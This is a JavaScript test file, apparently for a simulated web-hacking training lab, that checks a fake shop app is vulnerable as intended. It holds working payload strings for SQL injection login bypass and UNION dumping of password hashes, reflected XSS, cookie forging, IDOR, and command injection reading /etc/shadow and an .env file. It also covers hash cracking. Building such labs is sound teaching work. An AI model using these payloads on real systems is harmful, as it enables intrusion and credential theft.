const assert = require('assert');
['core/util','core/hash','engine/vfs','engine/shell','engine/coreutils','engine/awk','engine/sysutils','engine/netsim','engine/sql','engine/apps'].forEach(f => require('../js/' + f + '.js'));
const net = new PS.Net({ hosts: {}, dns: {} }, 'kali');
const shop = PS.apps.shop(net);
net.hosts = {
  kali: { ip: '10.10.5.10', mac: 'aa', gw: '10.10.5.1' },
  web01: { ip: '10.10.5.20', mac: 'bb', names: ['shop.example.test'], ports: { 80: { svc: 'http' }, 22: { svc: 'ssh' } }, http: shop.http, serverHeader: 'nginx/1.14.0 (Ubuntu)' },
};
const req = (m, url, o = {}) => net.request({ method: m, url, headers: o.headers || {}, body: o.body });
const body = (m, url, o) => req(m, url, o).body;
const cookieOf = r => /session=([^;]+)/.exec(r.headers['Set-Cookie'] || '')?.[1];

// SQL engine
const E = new PS.SQL.Engine(PS.apps.shopDb());
assert.deepStrictEqual(E.query("SELECT username FROM users WHERE id=2").rows, [['alice']]);
assert.strictEqual(E.query("SELECT 1, 'a' UNION SELECT id, username FROM users").rows.length, 5);
assert.throws(() => E.query("SELECT id, name FROM products UNION SELECT 1"), /different number of columns/);
assert.throws(() => E.query("SELECT * FROM nope"), /doesn't exist/);
assert.throws(() => E.query("SELECT 'abc"), /syntax/);
assert.throws(() => E.query("SELECT id FROM users WHERE username='a'--'"), /syntax/);
assert.strictEqual(E.query("SELECT id FROM users WHERE username='ADMIN'").rows.length, 1);
assert.strictEqual(E.query("SELECT table_name FROM information_schema.tables WHERE table_schema=database()").rows.length, 4);
assert.strictEqual(E.query("SELECT group_concat(username) FROM users").rows[0][0], 'admin,alice,demo,bob');
assert.strictEqual(E.query("SELECT username FROM users ORDER BY id DESC LIMIT 1").rows[0][0], 'bob');

// recon
assert(body('GET', 'http://shop.example.test/robots.txt').includes('/backup/'));
assert(body('GET', 'http://shop.example.test/backup/db_backup_2024-09-30.sql.bak').includes('FLAG{robots_txt_leads_to_backup_3c77}'));
const hdr = req('GET', 'http://shop.example.test/');
assert.strictEqual(hdr.headers.Server, 'nginx/1.14.0 (Ubuntu)'); assert(hdr.headers['X-Powered-By'].startsWith('PHP'));
assert(body('GET', 'http://shop.example.test/login').includes('demo / demo2024'));
// XSS reflection is unescaped, product listing is escaped
assert(body('GET', 'http://shop.example.test/search?q=<script>alert(1)</script>').includes('<script>alert(1)</script>'));
// numeric sqli + union
assert(body('GET', 'http://shop.example.test/products?id=1').includes('USB-C'));
assert(body('GET', "http://shop.example.test/products?id=1'").includes('Database error'));
assert(body('GET', 'http://shop.example.test/products?id=0 UNION SELECT 1,username,password FROM users').includes(PS.hash.md5('summer2024')));
assert(body('GET', 'http://shop.example.test/products?id=0 UNION SELECT 1,note,3 FROM internal_notes').includes('FLAG{union_select_dumped_the_vault_b91a}'));
// login sqli
const post = (u, p) => req('POST', 'http://shop.example.test/login', { body: `username=${encodeURIComponent(u)}&password=${encodeURIComponent(p)}` });
assert.strictEqual(post('admin', 'wrong').status, 401);
assert.strictEqual(post("admin'--", 'x').status, 500); // no space after -- => MySQL syntax error
let r = post("admin'-- -", 'x'); assert.strictEqual(r.status, 302);
let tok = cookieOf(r);
assert(body('GET', 'http://shop.example.test/admin', { headers: { Cookie: 'session=' + tok } }).includes('FLAG{sqli_login_bypass_7f3a}'));
r = post("' OR 1=1 #", 'x'); assert.strictEqual(r.status, 302);
// legit login with cracked pw
r = post('admin', 'summer2024'); tok = cookieOf(r);
assert(body('GET', 'http://shop.example.test/admin', { headers: { Cookie: 'session=' + tok } }).includes('FLAG{cracked_hash_legit_login_91c2}'));
// cookie forging
const forged = PS.b64enc('uid=3;role=admin');
assert(body('GET', 'http://shop.example.test/admin', { headers: { Cookie: 'session=' + forged } }).includes('FLAG{cookie_tampering_admin_5be0}'));
assert.strictEqual(req('GET', 'http://shop.example.test/admin').status, 302);
// IDOR as demo
const demo = cookieOf(post('demo', 'demo2024'));
assert(body('GET', 'http://shop.example.test/api/orders/1042', { headers: { Cookie: 'session=' + demo } }).includes('Gift wrap'));
assert(body('GET', 'http://shop.example.test/api/orders/1001', { headers: { Cookie: 'session=' + demo } }).includes('FLAG{idor_order_1001_e4d2}'));
assert.strictEqual(req('GET', 'http://shop.example.test/api/orders/1001').status, 401);
// command injection
const adm = 'session=' + cookieOf(post('admin', 'summer2024'));
const ping = body('GET', 'http://shop.example.test/admin/tools/ping?host=127.0.0.1', { headers: { Cookie: adm } });
assert(ping.includes('1 received') || ping.includes('1 packets transmitted'), ping);
const inj = body('GET', 'http://shop.example.test/admin/tools/ping?host=127.0.0.1;id', { headers: { Cookie: adm } });
assert(inj.includes('uid=33(www-data)'), inj);
assert(body('GET', 'http://shop.example.test/admin/tools/ping?host=127.0.0.1;cat+/opt/shop/.env', { headers: { Cookie: adm } }).includes('FLAG{command_injection_rce_0a9c}'));
assert(body('GET', 'http://shop.example.test/admin/tools/ping?host=127.0.0.1;cat+/etc/shadow', { headers: { Cookie: adm } }).includes('Permission denied'));

// tools in shell
const vfs = new PS.VFS().load({ '/usr/share/wordlists/rockyou-mini.txt': PS.apps.passwords.join('\n') + '\n', '/usr/share/wordlists/dirs.txt': PS.apps.dirs.join('\n') + '\n', '/home/kali/hashes.txt': ['admin:' + PS.hash.md5('summer2024'), 'alice:' + PS.hash.md5('alice123'), 'zed:' + PS.hash.md5('N0tInL1st!')].join('\n') + '\n' });
const sh = new PS.Shell({ vfs, net, host: 'kali', user: 'kali', users: { kali: { uid: 1000, home: '/home/kali', groups: ['kali'] } } });
let o = sh.exec('hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou-mini.txt'); assert(o.out.includes('Recovered........: 2/3') && o.out.includes(':summer2024'), o.out);
o = sh.exec('hashcat -m 0 hashes.txt x --show'); assert(o.out.includes('admin:' + PS.hash.md5('summer2024') + ':summer2024') || o.out.includes(':summer2024'), o.out + o.err);
o = sh.exec('john --wordlist=/usr/share/wordlists/rockyou-mini.txt --format=raw-md5 hashes.txt'); assert(o.out.includes('summer2024') && o.out.includes('(admin)'), o.out);
o = sh.exec('hashid 5f4dcc3b5aa765d61d8327deb882cf99'); assert(o.out.includes('MD5'));
o = sh.exec('gobuster dir -u http://shop.example.test -w /usr/share/wordlists/dirs.txt'); assert(o.out.includes('/robots.txt') && o.out.includes('/backup') && o.out.includes('/admin'), o.out);
console.log('web OK');
